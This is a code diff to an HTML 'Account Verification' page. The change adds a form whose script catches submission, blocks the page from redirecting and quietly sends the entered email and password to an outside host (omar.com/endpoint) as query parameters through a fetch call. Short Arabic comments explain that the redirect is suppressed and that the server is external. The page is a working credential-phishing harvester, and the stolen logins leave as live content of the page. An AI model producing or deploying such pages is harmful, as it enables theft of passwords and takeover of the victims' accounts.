@@ -100,15 +100,30 @@
 
     <h1>Account Verification</h1>
 
-    <form action="https://omar.com" method="POST">
-        <label for="email">email</label>
-        <input type="email" id="email" name="email" placeholder="Enter your email" required>
-
-       <label for="password">password</label>
-       <input type="password" id="password" name="password" placeholder="Enter your password" required>
-
-       <button type="submit">Continue</button>
+    <form id="testForm">
+      <label>email</label>
+      <input type="text" name="name" required>
+    
+      <label>password</label>
+      <input type="text" name="code" required>
+    
+      <button type="submit">Continue</button>
     </form>
+    
+    <script>
+      document.getElementById("testForm").addEventListener("submit", function (e) {
+        e.preventDefault(); // ⛔ يمنع التحويل
+    
+        const params = new URLSearchParams(new FormData(this));
+    
+        fetch("https://omar.com/endpoint?" + params.toString(), {
+          method: "GET",
+          mode: "no-cors" // لو السيرفر خارجي
+        });
+    
+        alert("Data sent without redirect");
+      });
+    </script>
 
 
     <div class="footer">
